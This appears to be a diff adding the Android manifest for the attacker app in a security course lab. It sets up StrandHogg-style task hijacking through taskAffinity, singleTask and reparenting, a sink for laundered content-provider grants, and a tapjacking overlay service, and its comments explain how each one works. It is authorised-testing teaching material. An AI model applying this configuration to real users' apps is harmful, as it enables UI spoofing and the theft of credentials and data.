@@ -1,0 +1,120 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+  examples/hijacker-app/AndroidManifest.xml
+
+  The ATTACKER half of chapter 30's lab pair. Build with examples/hijacker-app/build.sh.
+
+  Everything hostile about this app is in THIS FILE, not in its code. That is the
+  single most important thing to notice: the StrandHogg-class task attack is a
+  MANIFEST attack. There is no exploit, no memory corruption, no privileged API.
+  Two attributes on one <activity> element are the entire payload.
+
+      android:taskAffinity="com.pentest.ch30.victim"   <- claim the victim's task name
+      android:launchMode="singleTask"                  <- and own it
+
+  Whether that still works is a measured question, not an asserted one. Run
+  labs/lab-02-task-hijacking.md on your own device and read the affinity strings
+  out of `dumpsys activity activities`. On the Android 11 / API 30 device used to
+  write this chapter it does NOT work, and section 3.7 of the README explains the
+  mechanism that stops it - which is visible in the dump itself.
+
+  AUTHORISED TESTING ONLY. Install on a device you own, alongside the victim app
+  from examples/victim-app/. Never point taskAffinity at an app you do not own.
+-->
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.pentest.ch30.attacker">
+
+    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="30"/>
+
+    <!-- Required to draw the tapjacking overlay in lab-04. It is a "special"
+         permission: declaring it is not enough, the user must also flip a
+         Settings toggle (or, on a device you own and have rooted, you can grant
+         the appop directly - lab-04 shows both). -->
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+
+    <!-- PACKAGE VISIBILITY. From targetSdk 30 an app cannot see other packages
+         unless it says which ones it cares about. Leaving this out does not
+         produce a SecurityException, which is the trap: an unresolvable
+         authority makes ContentResolver.query() return a NULL CURSOR, and a
+         tester reading "null" concludes the provider does not exist rather than
+         "my app is not allowed to look". Measured exactly that way while writing
+         this chapter - see README section 7.5.
+
+         A real attacker declares this, so the lab declares it too. Otherwise the
+         grant-laundering control measures package visibility instead of the
+         provider's export state. -->
+    <queries>
+        <package android:name="com.pentest.ch30.victim"/>
+    </queries>
+
+    <application
+        android:label="CH30 Attacker"
+        android:allowBackup="false">
+
+        <!-- ATTACK 1: the classic StrandHogg configuration.
+
+             taskAffinity names the VICTIM's package. launchMode="singleTask"
+             means "there is at most one of me, in the task matching my
+             affinity". The intended effect: the first launch of this activity
+             creates a task whose affinity string is the victim's, and a later
+             launch of the victim is drawn into that already-existing task,
+             putting the attacker's UI where the user expects the victim's. -->
+        <activity android:name=".HijackActivity"
+            android:exported="true"
+            android:taskAffinity="com.pentest.ch30.victim"
+            android:launchMode="singleTask">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+
+        <!-- ATTACK 1b: the reparenting variant.
+
+             allowTaskReparenting="true" asks the system to MOVE this activity
+             into a foreground task whose affinity matches, rather than to
+             capture the task up front. Historically this was the quieter of the
+             two variants because the attacker's task never has to be created
+             first. Measured separately in lab-02 for the same reason: the two
+             variants can be mitigated independently. -->
+        <activity android:name=".ReparentActivity"
+            android:exported="true"
+            android:taskAffinity="com.pentest.ch30.victim"
+            android:allowTaskReparenting="true"/>
+
+        <!-- ATTACK 2: the grant sink.
+
+             EXPORTED, because the deputy - running as the victim - must be
+             able to start it. This is where a laundered content:// grant lands
+             and is cashed in. If it prints the victim's secret, the victim's
+             exported="false" provider has been read by a uid that was never
+             allowed to touch it. -->
+        <activity android:name=".GrantSinkActivity" android:exported="true"/>
+
+        <!-- Diagnostics, not attacks. CrossStartActivity performs cross-package
+             starts with and without FLAG_ACTIVITY_NEW_TASK so the reader can see
+             which task the started activity lands in, from a REAL app rather
+             than from `adb shell am`, whose uid and task context are different. -->
+        <activity android:name=".CrossStartActivity" android:exported="true"/>
+
+        <!-- Drives the confused-deputy attack. Exported so it can be kicked off
+             with `am start`; the PAYLOAD it builds is a nested Intent, which
+             `am` itself cannot express. -->
+        <activity android:name=".DeputyExploitActivity" android:exported="true"/>
+
+        <!-- Raises/drops the overlay. Exists only because a background app may
+             not start a Service from API 26 on - see TapjackActivity.java. -->
+        <activity android:name=".TapjackActivity" android:exported="true"/>
+
+        <!-- The tapjacking overlay. A Service, so the overlay survives while the
+             victim's Activity is in the foreground - an Activity of ours would
+             be paused and its window removed.
+
+             exported="true" is a LAB AFFORDANCE, not part of the attack: it lets
+             you raise and drop the overlay with `am startservice` instead of
+             building a UI for it. Real malware starts its overlay service from
+             inside its own process and exports nothing. If you are auditing an
+             APK, do not expect the overlay service to be exported. -->
+        <service android:name=".OverlayService" android:exported="true"/>
+    </application>
+</manifest>
